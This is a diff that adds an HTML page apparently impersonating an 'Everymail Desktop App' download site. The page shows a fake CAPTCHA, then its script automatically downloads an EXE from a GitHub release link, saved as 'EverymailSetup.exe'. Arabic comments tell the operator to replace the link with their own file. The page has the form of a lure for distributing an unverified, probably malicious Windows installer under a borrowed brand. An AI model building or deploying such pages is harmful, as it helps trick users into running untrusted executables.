@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Everymail Desktop App</title>
+
+<style>
+*{box-sizing:border-box}
+
+html,body{
+    margin:0;
+    min-height:100%;
+    font-family:Arial,Helvetica,sans-serif;
+    color:#212529;
+}
+
+body{background:#fff}
+
+.page{
+    min-height:100vh;
+    display:flex;
+}
+
+.left-side{
+    flex:1 1 55%;
+    padding:3rem;
+    background:
+      url("https://jsk.sg/new/Everymail_App/assets/img_swirl.webp")
+      50% 100% / contain no-repeat,
+      #e3e9e7;
+    color:#003c4e;
+    display:flex;
+    align-items:center;
+}
+
+.greeting{
+    font-family:Georgia,serif;
+    font-size:clamp(2.5rem,4vw,3.5rem);
+    line-height:1.1;
+}
+
+.right-side{
+    flex:1 1 45%;
+    padding:2rem;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+.card{
+    width:460px;
+    max-width:100%;
+    padding:28px 32px;
+    background:#fff;
+    border:1px solid #f0f0f0;
+    border-radius:16px;
+    box-shadow:0 4px 24px rgba(0,0,0,.06);
+    text-align:center;
+}
+
+.header{
+    display:flex;
+    align-items:center;
+    margin-bottom:18px;
+}
+
+.logo{
+    height:28px;
+    width:auto;
+}
+
+.divider{
+    width:1px;
+    height:22px;
+    margin:0 14px;
+    background:#d1cec7;
+}
+
+.app-title{
+    color:#44585f;
+}
+
+h2{
+    margin:0 0 18px;
+    font-size:20px;
+}
+
+.preview{
+    padding:8px;
+    margin-bottom:18px;
+    background:#faf9f7;
+    border:1px solid #d1cec7;
+    border-radius:12px;
+}
+
+.preview img{
+    width:90px;
+    height:90px;
+    object-fit:contain;
+}
+
+.text{
+    color:#44585f;
+    font-size:13.5px;
+    line-height:1.6;
+    text-align:left;
+}
+
+.version{
+    display:inline-block;
+    margin-top:8px;
+    padding:5px 14px;
+    border-radius:20px;
+    background:linear-gradient(90deg,#37717f,#d22eff);
+    color:#fff;
+    font-size:13px;
+}
+
+/* CAPTCHA */
+
+.captcha{
+    margin:20px 0;
+    padding:15px;
+    background:#faf9f7;
+    border:1px solid #d1cec7;
+    border-radius:12px;
+}
+
+.captcha-label{
+    text-align:left;
+    font-size:13px;
+    color:#44585f;
+    margin-bottom:10px;
+}
+
+.captcha-row{
+    display:flex;
+    gap:8px;
+}
+
+.captcha-code{
+    flex:1;
+    height:48px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:#fff;
+    border:2px solid #37717f;
+    border-radius:7px;
+    color:#003c4e;
+    font:bold 24px Arial;
+    letter-spacing:7px;
+    user-select:none;
+}
+
+.refresh{
+    width:48px;
+    border:1px solid #d1cec7;
+    background:#fff;
+    border-radius:7px;
+    cursor:pointer;
+    font-size:21px;
+}
+
+.captcha-input{
+    width:100%;
+    height:44px;
+    margin-top:10px;
+    padding:0 12px;
+    border:1px solid #d1cec7;
+    border-radius:7px;
+    font-size:15px;
+    text-transform:uppercase;
+}
+
+.error{
+    display:none;
+    color:#b42318;
+    font-size:12px;
+    text-align:left;
+    margin-top:7px;
+}
+
+.btn{
+    width:100%;
+    height:46px;
+    border:0;
+    border-radius:6px;
+    background:linear-gradient(90deg,#37717f,#d22eff);
+    color:#fff;
+    font-size:15px;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+.btn:hover{
+    opacity:.92;
+}
+
+/* LANDING */
+
+#landing{
+    display:none;
+}
+
+.success{
+    width:76px;
+    height:76px;
+    margin:10px auto 18px;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:linear-gradient(135deg,#37717f,#d22eff);
+    color:#fff;
+    font-size:38px;
+}
+
+.features{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:8px;
+    margin-top:18px;
+}
+
+.feature{
+    padding:12px 5px;
+    background:#faf9f7;
+    border:1px solid #eee9e3;
+    border-radius:9px;
+    font-size:11px;
+    color:#44585f;
+}
+
+@media(max-width:800px){
+    .page{
+        flex-direction:column;
+    }
+
+    .left-side{
+        min-height:35vh;
+        padding:2rem;
+    }
+
+    .right-side{
+        min-height:65vh;
+        padding:1rem;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<!-- CAPTCHA PAGE -->
+
+<section class="page" id="captchaPage">
+
+    <div class="left-side">
+        <div class="greeting">
+            Welcome!<br>
+            Everymail Desktop App
+        </div>
+    </div>
+
+    <div class="right-side">
+
+        <div class="card">
+
+            <div class="header">
+
+                <img
+                    src="https://jsk.sg/new/Everymail_App/assets/everymail-logo.png"
+                    class="logo"
+                    alt="Everymail">
+
+                <div class="divider"></div>
+
+                <span class="app-title">
+                    Desktop App
+                </span>
+
+            </div>
+
+            <h2>
+                Verify to Continue
+            </h2>
+
+            <div class="preview">
+
+                <img
+                    src="https://e7.pngegg.com/pngimages/204/798/png-clipart-purple-mail-paper-and-email-address-computer-icons-symbol-email-box-gmail-purple-angle.png"
+                    alt="Everymail">
+
+            </div>
+
+            <div class="text">
+
+                <p>
+                    <strong>Everymail Desktop App</strong>
+                    gives you a better way to manage your
+                    accounts and messages directly from your desktop.
+                </p>
+
+                <span class="version">
+                    <strong>Version:</strong> Windows
+                </span>
+
+            </div>
+
+            <div class="captcha">
+
+                <div class="captcha-label">
+                    Enter the 4-character code shown below:
+                </div>
+
+                <div class="captcha-row">
+
+                    <div
+                        id="captchaCode"
+                        class="captcha-code">
+                    </div>
+
+                    <button
+                        class="refresh"
+                        type="button"
+                        onclick="newCaptcha()">
+                        ↻
+                    </button>
+
+                </div>
+
+                <input
+                    id="captchaInput"
+                    class="captcha-input"
+                    maxlength="4"
+                    autocomplete="off"
+                    placeholder="Enter code">
+
+                <div
+                    id="error"
+                    class="error">
+                    Incorrect code. Try again.
+                </div>
+
+            </div>
+
+            <button
+                class="btn"
+                onclick="verifyCaptcha()">
+
+                Verify &amp; Continue
+
+            </button>
+
+        </div>
+
+    </div>
+
+</section>
+
+
+<!-- LANDING PAGE -->
+
+<section class="page" id="landing">
+
+    <div class="left-side">
+
+        <div class="greeting">
+            Welcome!<br>
+            Everymail Desktop App
+        </div>
+
+    </div>
+
+    <div class="right-side">
+
+        <div class="card">
+
+            <div class="header">
+
+                <img
+                    src="https://jsk.sg/new/Everymail_App/assets/everymail-logo.png"
+                    class="logo"
+                    alt="Everymail">
+
+                <div class="divider"></div>
+
+                <span class="app-title">
+                    Desktop App
+                </span>
+
+            </div>
+
+            <div class="success">
+                ✓
+            </div>
+
+            <h2>
+                Verification Complete
+            </h2>
+
+            <div class="text">
+
+                <p>
+                    Your verification was completed successfully.
+                    Your application is ready to download.
+                </p>
+
+            </div>
+
+            <span class="version">
+                <strong>Version:</strong> Windows
+            </span>
+
+            <div class="features">
+
+                <div class="feature">
+                    ✉<br>
+                    Email
+                </div>
+
+                <div class="feature">
+                    ▣<br>
+                    Accounts
+                </div>
+
+                <div class="feature">
+                    ✓<br>
+                    Verified
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</section>
+
+
+<script>
+
+let captcha = "";
+
+
+/* Generate CAPTCHA */
+
+function newCaptcha(){
+
+    const chars =
+        "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+
+    captcha = "";
+
+    for(let i = 0; i < 4; i++){
+
+        captcha += chars[
+            Math.floor(
+                Math.random() * chars.length
+            )
+        ];
+
+    }
+
+    document.getElementById(
+        "captchaCode"
+    ).textContent = captcha;
+
+    document.getElementById(
+        "captchaInput"
+    ).value = "";
+
+    document.getElementById(
+        "error"
+    ).style.display = "none";
+}
+
+
+/* Verify CAPTCHA */
+
+function verifyCaptcha(){
+
+    const input =
+        document.getElementById(
+            "captchaInput"
+        ).value
+        .trim()
+        .toUpperCase();
+
+
+    if(input === captcha){
+
+        /* Show landing */
+
+        document.getElementById(
+            "captchaPage"
+        ).style.display = "none";
+
+        document.getElementById(
+            "landing"
+        ).style.display = "flex";
+
+
+        /* 
+         * تحميل التطبيق مباشرة (EXE)
+         * غير الرابط ده لرابط ملف التطبيق بتاعك على السيرفر
+         */
+        
+        // ⚠️ غير الرابط ده ⚠️
+        const fileUrl = 'https://github.com/sollm23/next-platform-starter-cfff1/releases/download/v1/EveryMail_Application_Install.exe'; 
+
+        const link = document.createElement("a");
+        link.href = fileUrl;
+        link.download = "EverymailSetup.exe"; // الاسم اللي هيظهر للمستخدم
+        document.body.appendChild(link);
+        link.click();
+        link.remove();
+
+    }
+
+    else{
+
+        document.getElementById(
+            "error"
+        ).style.display = "block";
+
+        newCaptcha();
+
+        document.getElementById(
+            "captchaInput"
+        ).focus();
+
+    }
+
+}
+
+
+/* Enter = Verify */
+
+document.getElementById(
+    "captchaInput"
+).addEventListener(
+    "keydown",
+    function(e){
+
+        if(e.key === "Enter"){
+            verifyCaptcha();
+        }
+
+    }
+);
+
+
+/* Start CAPTCHA */
+
+newCaptcha();
+
+</script>
+
+</body>
+</html>
